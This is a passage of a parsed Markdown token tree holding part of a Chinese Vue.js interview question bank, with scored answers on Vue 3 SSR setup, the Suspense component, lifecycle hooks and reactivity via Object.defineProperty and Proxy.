Object.defineProperty () 方法，它只能对对象的已有属性进行逐个劫持，对于新增属性需要使用Vue.set方法来手动触发响应式更新。","text":"**1：** 对比 Vue 2.x 使用的 Object.defineProperty () 方法，它只能对对象的已有属性进行逐个劫持，对于新增属性需要使用Vue.set方法来手动触发响应式更新。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 对比 Vue 2.x 使用的 Object.defineProperty () 方法，它只能对对象的已有属性进行逐个劫持，对于新增属性需要使用Vue.set方法来手动触发响应式更新。","text":" 对比 Vue 2.x 使用的 Object.defineProperty () 方法，它只能对对象的已有属性进行逐个劫持，对于新增属性需要使用Vue.set方法来手动触发响应式更新。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 在 Vue 3 中，通过reactive创建的响应式对象是深层响应式的，而 Vue 2.x 中对象内部嵌套的对象，需要递归遍历进行深度响应式转换。","task":false,"loose":false,"text":"**1：** 在 Vue 3 中，通过reactive创建的响应式对象是深层响应式的，而 Vue 2.x 中对象内部嵌套的对象，需要递归遍历进行深度响应式转换。","tokens":[{"type":"text","raw":"**1：** 在 Vue 3 中，通过reactive创建的响应式对象是深层响应式的，而 Vue 2.x 中对象内部嵌套的对象，需要递归遍历进行深度响应式转换。","text":"**1：** 在 Vue 3 中，通过reactive创建的响应式对象是深层响应式的，而 Vue 2.x 中对象内部嵌套的对象，需要递归遍历进行深度响应式转换。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 Vue 3 中，通过reactive创建的响应式对象是深层响应式的，而 Vue 2.x 中对象内部嵌套的对象，需要递归遍历进行深度响应式转换。","text":" 在 Vue 3 中，通过reactive创建的响应式对象是深层响应式的，而 Vue 2.x 中对象内部嵌套的对象，需要递归遍历进行深度响应式转换。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 19. 在 Vue 3 项目中，如何进行 SSR（服务器端渲染）\\n\\n","depth":2,"text":"19. 在 Vue 3 项目中，如何进行 SSR（服务器端渲染）","tokens":[{"type":"text","raw":"19. 在 Vue 3 项目中，如何进行 SSR（服务器端渲染）","text":"19. 在 Vue 3 项目中，如何进行 SSR（服务器端渲染）","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3分）\\n\\n","depth":4,"text":"解答（3分）","tokens":[{"type":"text","raw":"解答（3分）","text":"解答（3分）","escaped":false}]},{"type":"list","raw":"* **0：** 搭建项目基础：创建 Vue 3 项目，可使用@vue/cli工具，通过命令vue create my-ssr-app创建项目，选择相关 Vue 3 选项。\\n* **1：** 添加 SSR 相关依赖：安装`@vue/server-renderer`和`express`等依赖，`@vue/server-renderer`用于服务器端渲染，`express`作为服务器框架。命令\\n为`npm install @vue/server-renderer express`。\\n* **1：** 创建服务器文件：在项目根目录下创建server.js文件，用于创建服务器和处理 SSR 逻辑。在文件中，引入express，创建服务器实例，设置路由，使\\n用@vue/server-renderer将 Vue 组件渲染为 HTML 字符串并返回。\\n* **1：** 调整 Vue 项目代码：在 Vue 项目中，需要创建一个用于服务器端渲染的入口文件，如`entry-server.js`，在该文件中，创建 Vue 应用实例，并导出。同时，可能\\n需要调整一些组件的逻辑，以适应服务器端渲染的环境。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **0：** 搭建项目基础：创建 Vue 3 项目，可使用@vue/cli工具，通过命令vue create my-ssr-app创建项目，选择相关 Vue 3 选项。\\n","task":false,"loose":false,"text":"**0：** 搭建项目基础：创建 Vue 3 项目，可使用@vue/cli工具，通过命令vue create my-ssr-app创建项目，选择相关 Vue 3 选项。","tokens":[{"type":"text","raw":"**0：** 搭建项目基础：创建 Vue 3 项目，可使用@vue/cli工具，通过命令vue create my-ssr-app创建项目，选择相关 Vue 3 选项。","text":"**0：** 搭建项目基础：创建 Vue 3 项目，可使用@vue/cli工具，通过命令vue create my-ssr-app创建项目，选择相关 Vue 3 选项。","tokens":[{"type":"strong","raw":"**0：**","text":"0：","tokens":[{"type":"text","raw":"0：","text":"0：","escaped":false}]},{"type":"text","raw":" 搭建项目基础：创建 Vue 3 项目，可使用@vue/cli工具，通过命令vue create my-ssr-app创建项目，选择相关 Vue 3 选项。","text":" 搭建项目基础：创建 Vue 3 项目，可使用@vue/cli工具，通过命令vue create my-ssr-app创建项目，选择相关 Vue 3 选项。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 添加 SSR 相关依赖：安装`@vue/server-renderer`和`express`等依赖，`@vue/server-renderer`用于服务器端渲染，`express`作为服务器框架。命令\\n为`npm install @vue/server-renderer express`。\\n","task":false,"loose":false,"text":"**1：** 添加 SSR 相关依赖：安装`@vue/server-renderer`和`express`等依赖，`@vue/server-renderer`用于服务器端渲染，`express`作为服务器框架。命令\\n为`npm install @vue/server-renderer express`。","tokens":[{"type":"text","raw":"**1：** 添加 SSR 相关依赖：安装`@vue/server-renderer`和`express`等依赖，`@vue/server-renderer`用于服务器端渲染，`express`作为服务器框架。命令\\n\\n为`npm install @vue/server-renderer express`。","text":"**1：** 添加 SSR 相关依赖：安装`@vue/server-renderer`和`express`等依赖，`@vue/server-renderer`用于服务器端渲染，`express`作为服务器框架。命令\\n为`npm install @vue/server-renderer express`。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 添加 SSR 相关依赖：安装","text":" 添加 SSR 相关依赖：安装","escaped":false},{"type":"codespan","raw":"`@vue/server-renderer`","text":"@vue/server-renderer"},{"type":"text","raw":"和","text":"和","escaped":false},{"type":"codespan","raw":"`express`","text":"express"},{"type":"text","raw":"等依赖，","text":"等依赖，","escaped":false},{"type":"codespan","raw":"`@vue/server-renderer`","text":"@vue/server-renderer"},{"type":"text","raw":"用于服务器端渲染，","text":"用于服务器端渲染，","escaped":false},{"type":"codespan","raw":"`express`","text":"express"},{"type":"text","raw":"作为服务器框架。命令\\n为","text":"作为服务器框架。命令\\n为","escaped":false},{"type":"codespan","raw":"`npm install @vue/server-renderer express`","text":"npm install @vue/server-renderer express"},{"type":"text","raw":"。","text":"。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 创建服务器文件：在项目根目录下创建server.js文件，用于创建服务器和处理 SSR 逻辑。在文件中，引入express，创建服务器实例，设置路由，使\\n用@vue/server-renderer将 Vue 组件渲染为 HTML 字符串并返回。\\n","task":false,"loose":false,"text":"**1：** 创建服务器文件：在项目根目录下创建server.js文件，用于创建服务器和处理 SSR 逻辑。在文件中，引入express，创建服务器实例，设置路由，使\\n用@vue/server-renderer将 Vue 组件渲染为 HTML 字符串并返回。","tokens":[{"type":"text","raw":"**1：** 创建服务器文件：在项目根目录下创建server.js文件，用于创建服务器和处理 SSR 逻辑。在文件中，引入express，创建服务器实例，设置路由，使\\n\\n用@vue/server-renderer将 Vue 组件渲染为 HTML 字符串并返回。","text":"**1：** 创建服务器文件：在项目根目录下创建server.js文件，用于创建服务器和处理 SSR 逻辑。在文件中，引入express，创建服务器实例，设置路由，使\\n用@vue/server-renderer将 Vue 组件渲染为 HTML 字符串并返回。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 创建服务器文件：在项目根目录下创建server.js文件，用于创建服务器和处理 SSR 逻辑。在文件中，引入express，创建服务器实例，设置路由，使\\n用@vue/server-renderer将 Vue 组件渲染为 HTML 字符串并返回。","text":" 创建服务器文件：在项目根目录下创建server.js文件，用于创建服务器和处理 SSR 逻辑。在文件中，引入express，创建服务器实例，设置路由，使\\n用@vue/server-renderer将 Vue 组件渲染为 HTML 字符串并返回。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 调整 Vue 项目代码：在 Vue 项目中，需要创建一个用于服务器端渲染的入口文件，如`entry-server.js`，在该文件中，创建 Vue 应用实例，并导出。同时，可能\\n需要调整一些组件的逻辑，以适应服务器端渲染的环境。","task":false,"loose":false,"text":"**1：** 调整 Vue 项目代码：在 Vue 项目中，需要创建一个用于服务器端渲染的入口文件，如`entry-server.js`，在该文件中，创建 Vue 应用实例，并导出。同时，可能\\n需要调整一些组件的逻辑，以适应服务器端渲染的环境。","tokens":[{"type":"text","raw":"**1：** 调整 Vue 项目代码：在 Vue 项目中，需要创建一个用于服务器端渲染的入口文件，如`entry-server.js`，在该文件中，创建 Vue 应用实例，并导出。同时，可能\\n\\n需要调整一些组件的逻辑，以适应服务器端渲染的环境。","text":"**1：** 调整 Vue 项目代码：在 Vue 项目中，需要创建一个用于服务器端渲染的入口文件，如`entry-server.js`，在该文件中，创建 Vue 应用实例，并导出。同时，可能\\n需要调整一些组件的逻辑，以适应服务器端渲染的环境。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 调整 Vue 项目代码：在 Vue 项目中，需要创建一个用于服务器端渲染的入口文件，如","text":" 调整 Vue 项目代码：在 Vue 项目中，需要创建一个用于服务器端渲染的入口文件，如","escaped":false},{"type":"codespan","raw":"`entry-server.js`","text":"entry-server.js"},{"type":"text","raw":"，在该文件中，创建 Vue 应用实例，并导出。同时，可能\\n需要调整一些组件的逻辑，以适应服务器端渲染的环境。","text":"，在该文件中，创建 Vue 应用实例，并导出。同时，可能\\n需要调整一些组件的逻辑，以适应服务器端渲染的环境。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 20. Vue 3中的Suspense组件的作用是什么，它是如何工作的？\\n\\n","depth":2,"text":"20. Vue 3中的Suspense组件的作用是什么，它是如何工作的？","tokens":[{"type":"text","raw":"20. Vue 3中的Suspense组件的作用是什么，它是如何工作的？","text":"20. Vue 3中的Suspense组件的作用是什么，它是如何工作的？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* **1：** Suspense是在vue3中新提供的，用来处理异步组件的加载状态。\\n* **1：** Suspense 组件允许你指定一个加载中的状态`（fallback）`和一个加载失败的状态`（fallback slot）`，用于处理异步组件的加载状态。当异步组件加载时，会先显示加载中\\n的状态；加载完成后，会显示异步组件；如果加载失败，会显示加载失败的状态。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** Suspense是在vue3中新提供的，用来处理异步组件的加载状态。\\n","task":false,"loose":false,"text":"**1：** Suspense是在vue3中新提供的，用来处理异步组件的加载状态。","tokens":[{"type":"text","raw":"**1：** Suspense是在vue3中新提供的，用来处理异步组件的加载状态。","text":"**1：** Suspense是在vue3中新提供的，用来处理异步组件的加载状态。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Suspense是在vue3中新提供的，用来处理异步组件的加载状态。","text":" Suspense是在vue3中新提供的，用来处理异步组件的加载状态。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Suspense 组件允许你指定一个加载中的状态`（fallback）`和一个加载失败的状态`（fallback slot）`，用于处理异步组件的加载状态。当异步组件加载时，会先显示加载中\\n的状态；加载完成后，会显示异步组件；如果加载失败，会显示加载失败的状态。","task":false,"loose":false,"text":"**1：** Suspense 组件允许你指定一个加载中的状态`（fallback）`和一个加载失败的状态`（fallback slot）`，用于处理异步组件的加载状态。当异步组件加载时，会先显示加载中\\n的状态；加载完成后，会显示异步组件；如果加载失败，会显示加载失败的状态。","tokens":[{"type":"text","raw":"**1：** Suspense 组件允许你指定一个加载中的状态`（fallback）`和一个加载失败的状态`（fallback slot）`，用于处理异步组件的加载状态。当异步组件加载时，会先显示加载中\\n\\n的状态；加载完成后，会显示异步组件；如果加载失败，会显示加载失败的状态。","text":"**1：** Suspense 组件允许你指定一个加载中的状态`（fallback）`和一个加载失败的状态`（fallback slot）`，用于处理异步组件的加载状态。当异步组件加载时，会先显示加载中\\n的状态；加载完成后，会显示异步组件；如果加载失败，会显示加载失败的状态。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Suspense 组件允许你指定一个加载中的状态","text":" Suspense 组件允许你指定一个加载中的状态","escaped":false},{"type":"codespan","raw":"`（fallback）`","text":"（fallback）"},{"type":"text","raw":"和一个加载失败的状态","text":"和一个加载失败的状态","escaped":false},{"type":"codespan","raw":"`（fallback slot）`","text":"（fallback slot）"},{"type":"text","raw":"，用于处理异步组件的加载状态。当异步组件加载时，会先显示加载中\\n的状态；加载完成后，会显示异步组件；如果加载失败，会显示加载失败的状态。","text":"，用于处理异步组件的加载状态。当异步组件加载时，会先显示加载中\\n的状态；加载完成后，会显示异步组件；如果加载失败，会显示加载失败的状态。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 21. vue的生命周期有哪些及每个生命周期做了什么？\\n\\n","depth":2,"text":"21. vue的生命周期有哪些及每个生命周期做了什么？","tokens":[{"type":"text","raw":"21. vue的生命周期有哪些及每个生命周期做了什么？","text":"21. vue的生命周期有哪些及每个生命周期做了什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3分）\\n\\n","depth":4,"text":"解答（3分）","tokens":[{"type":"text","raw":"解答（3分）","text":"解答（3分）","escaped":false}]},{"type":"list","raw":"* beforeCreate是new Vue()之后触发的第一个钩子，在当前阶段data、methods、computed以及watch上的数据和方法都不能被访问。\\n\\n* created是实例创建完成后触发的钩子，当前阶段已经完成了数据观测、属性和方法的运算，watch/event事件回调。然而，挂载阶段还没开始，$el属性目前不可见。\\n\\n* beforeMount是挂载开始之前被触发的钩子，相关的render函数首次被调用。该钩子在服务器端渲染期间不被调用。\\n\\n* mounted是el被新创建的vm.$el替换，并挂载到实例上去之后调用该钩子。如果根实例挂载到一个文档内元素上，当mounted被调用时vm.$el也在文档内。该钩子在服务器端渲染期间不被调用。\\n\\n* beforeUpdate是数据更新时调用，发生在虚拟DOM重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。\\n\\n* updated是由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。当这个钩子被调用时，组件DOM已经更新，所以你现在可以执行依赖于DOM的操作。然而请注意，在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。\\n\\n* beforeDestroy是实例销毁之前调用。在这一步，实例仍然完全可用。\\n\\n* destroyed是Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* beforeCreate是new Vue()之后触发的第一个钩子，在当前阶段data、methods、computed以及watch上的数据和方法都不能被访问。\\n\\n","task":false,"loose":true,"text":"beforeCreate是new Vue()之后触发的第一个钩子，在当前阶段data、methods、computed以及watch上的数据和方法都不能被访问。\\n","tokens":[{"type":"text","raw":"beforeCreate是new Vue()之后触发的第一个钩子，在当前阶段data、methods、computed以及watch上的数据和方法都不能被访问。\\n","text":"beforeCreate是new Vue()之后触发的第一个钩子，在当前阶段data、methods、computed以及watch上的数据和方法都不能被访问。","tokens":[{"type":"text","raw":"beforeCreate是new Vue()之后触发的第一个钩子，在当前阶段data、methods、computed以及watch上的数据和方法都不能被访问。","text":"beforeCreate是new Vue()之后触发的第一个钩子，在当前阶段data、methods、computed以及watch上的数据和方法都不能被访问。","escaped":false}]}]},{"type":"list_item","raw":"* created是实例创建完成后触发的钩子，当前阶段已经完成了数据观测、属性和方法的运算，watch/event事件回调。然而，挂载阶段还没开始，$el属性目前不可见。\\n\\n","task":false,"loose":true,"text":"created是实例创建完成后触发的钩子，当前阶段已经完成了数据观测、属性和方法的运算，watch/event事件回调。然而，挂载阶段还没开始，$el属性目前不可见。\\n","tokens":[{"type":"text","raw":"created是实例创建完成后触发的钩子，当前阶段已经完成了数据观测、属性和方法的运算，watch/event事件回调。然而，挂载阶段还没开始，$el属性目前不可见。\\n","text":"created是实例创建完成后触发的钩子，当前阶段已经完成了数据观测、属性和方法的运算，watch/event事件回调。然而，挂载阶段还没开始，$el属性目前不可见。","tokens":[{"type":"text","raw":"created是实例创建完成后触发的钩子，当前阶段已经完成了数据观测、属性和方法的运算，watch/event事件回调。然而，挂载阶段还没开始，$el属性目前不可见。","text":"created是实例创建完成后触发的钩子，当前阶段已经完成了数据观测、属性和方法的运算，watch/event事件回调。然而，挂载阶段还没开始，$el属性目前不可见。","escaped":false}]}]},{"type":"list_item","raw":"* beforeMount是挂载开始之前被触发的钩子，相关的render函数首次被调用。该钩子在服务器端渲染期间不被调用。\\n\\n","task":false,"loose":true,"text":"beforeMount是挂载开始之前被触发的钩子，相关的render函数首次被调用。该钩子在服务器端渲染期间不被调用。\\n","tokens":[{"type":"text","raw":"beforeMount是挂载开始之前被触发的钩子，相关的render函数首次被调用。该钩子在服务器端渲染期间不被调用。\\n","text":"beforeMount是挂载开始之前被触发的钩子，相关的render函数首次被调用。该钩子在服务器端渲染期间不被调用。","tokens":[{"type":"text","raw":"beforeMount是挂载开始之前被触发的钩子，相关的render函数首次被调用。该钩子在服务器端渲染期间不被调用。","text":"beforeMount是挂载开始之前被触发的钩子，相关的render函数首次被调用。该钩子在服务器端渲染期间不被调用。","escaped":false}]}]},{"type":"list_item","raw":"* mounted是el被新创建的vm.$el替换，并挂载到实例上去之后调用该钩子。如果根实例挂载到一个文档内元素上，当mounted被调用时vm.$el也在文档内。该钩子在服务器端渲染期间不被调用。\\n\\n","task":false,"loose":true,"text":"mounted是el被新创建的vm.$el替换，并挂载到实例上去之后调用该钩子。如果根实例挂载到一个文档内元素上，当mounted被调用时vm.$el也在文档内。该钩子在服务器端渲染期间不被调用。\\n","tokens":[{"type":"text","raw":"mounted是el被新创建的vm.$el替换，并挂载到实例上去之后调用该钩子。如果根实例挂载到一个文档内元素上，当mounted被调用时vm.$el也在文档内。该钩子在服务器端渲染期间不被调用。\\n","text":"mounted是el被新创建的vm.$el替换，并挂载到实例上去之后调用该钩子。如果根实例挂载到一个文档内元素上，当mounted被调用时vm.$el也在文档内。该钩子在服务器端渲染期间不被调用。","tokens":[{"type":"text","raw":"mounted是el被新创建的vm.$el替换，并挂载到实例上去之后调用该钩子。如果根实例挂载到一个文档内元素上，当mounted被调用时vm.$el也在文档内。该钩子在服务器端渲染期间不被调用。","text":"mounted是el被新创建的vm.$el替换，并挂载到实例上去之后调用该钩子。如果根实例挂载到一个文档内元素上，当mounted被调用时vm.$el也在文档内。该钩子在服务器端渲染期间不被调用。","escaped":false}]}]},{"type":"list_item","raw":"* beforeUpdate是数据更新时调用，发生在虚拟DOM重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。\\n\\n","task":false,"loose":true,"text":"beforeUpdate是数据更新时调用，发生在虚拟DOM重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。\\n","tokens":[{"type":"text","raw":"beforeUpdate是数据更新时调用，发生在虚拟DOM重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。\\n","text":"beforeUpdate是数据更新时调用，发生在虚拟DOM重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。","tokens":[{"type":"text","raw":"beforeUpdate是数据更新时调用，发生在虚拟DOM重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。","text":"beforeUpdate是数据更新时调用，发生在虚拟DOM重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。","escaped":false}]}]},{"type":"list_item","raw":"* updated是由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。当这个钩子被调用时，组件DOM已经更新，所以你现在可以执行依赖于DOM的操作。然而请注意，在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。\\n\\n","task":false,"loose":true,"text":"updated是由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。当这个钩子被调用时，组件DOM已经更新，所以你现在可以执行依赖于DOM的操作。然而请注意，在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。\\n","tokens":[{"type":"text","raw":"updated是由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。当这个钩子被调用时，组件DOM已经更新，所以你现在可以执行依赖于DOM的操作。然而请注意，在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。\\n","text":"updated是由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。当这个钩子被调用时，组件DOM已经更新，所以你现在可以执行依赖于DOM的操作。然而请注意，在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。","tokens":[{"type":"text","raw":"updated是由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。当这个钩子被调用时，组件DOM已经更新，所以你现在可以执行依赖于DOM的操作。然而请注意，在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。","text":"updated是由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。当这个钩子被调用时，组件DOM已经更新，所以你现在可以执行依赖于DOM的操作。然而请注意，在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。","escaped":false}]}]},{"type":"list_item","raw":"* beforeDestroy是实例销毁之前调用。在这一步，实例仍然完全可用。\\n\\n","task":false,"loose":true,"text":"beforeDestroy是实例销毁之前调用。在这一步，实例仍然完全可用。\\n","tokens":[{"type":"text","raw":"beforeDestroy是实例销毁之前调用。在这一步，实例仍然完全可用。\\n","text":"beforeDestroy是实例销毁之前调用。在这一步，实例仍然完全可用。","tokens":[{"type":"text","raw":"beforeDestroy是实例销毁之前调用。在这一步，实例仍然完全可用。","text":"beforeDestroy是实例销毁之前调用。在这一步，实例仍然完全可用。","escaped":false}]}]},{"type":"list_item","raw":"* destroyed是Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。","task":false,"loose":true,"text":"destroyed是Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。","tokens":[{"type":"text","raw":"destroyed是Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。","text":"destroyed是Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。","tokens":[{"type":"text","raw":"destroyed是Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。","text":"destroyed是Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 22. vue响应式原理是什么？vue3的响应式有何不同?\\n\\n","depth":2,"text":"22. vue响应式原理是什么？vue3的响应式有何不同?","tokens":[{"type":"text","raw":"22. vue响应式原理是什么？vue3的响应式有何不同?","text":"22. vue响应式原理是什么？vue3的响应式有何不同?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* Vue在初始化数据时，会使用Object.defineProperty重新定义data中的所有属性，当页面使用对应属性时，首先会进行依赖收集(收集当前组件的watcher)如果属性发生变化会通知相关依赖进行更新操作(发布订阅)。\\n\\n* Vue3.x改用Proxy替代Object.defineProperty。因为Proxy可以直接监听对象和数组的变化，并且有多达13种拦截方法。并且作为新标准将受到浏览器厂商重点持续的性能优化。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* Vue在初始化数据时，会使用Object.defineProperty重新定义data中的所有属性，当页面使用对应属性时，首先会进行依赖收集(收集当前组件的watcher)如果属性发生变化会通知相关依赖进行更新操作(发布订阅)。\\n\\n","task":false,"loose":true,"text":"Vue在初始化数据时，会使用Object.defineProperty重新定义data中的所有属性，当页面使用对应属性时，首先会进行依赖收集(收集当前组件的watcher)如果属性发生变化会通知相关依赖进行更新操作(发布订阅)。\\n","tokens":[{"type":"text","raw":"Vue在初始化数据时，会使用Object.defineProperty重新定义data中的所有属性，当页面使用对应属性时，首先会进行依赖收集(收集当前组件的watcher)如果属性发生变化会通知相关依赖进行更新操作(发布订阅)。\\n","text":"Vue在初始化数据时，会使用Object.defineProperty重新定义data中的所有属性，当页面使用对应属性时，首先会进行依赖收集(收集当前组件的watcher)如果属性发生变化会通知相关依赖进行更新操作(发布订阅)。","tokens":[{"type":"text","raw":"Vue在初始化数据时，会使用Object.defineProperty重新定义data中的所有属性，当页面使用对应属性时，首先会进行依赖收集(收集当前组件的watcher)如果属性发生变化会通知相关依赖进行更新操作(发布订阅)。","text":"Vue在初始化数据时，会使用Object.defineProperty重新定义data中的所有属性，当页面使用对应属性时，首先会进行依赖收集(收集当前组件的watcher)如果属性发生变化会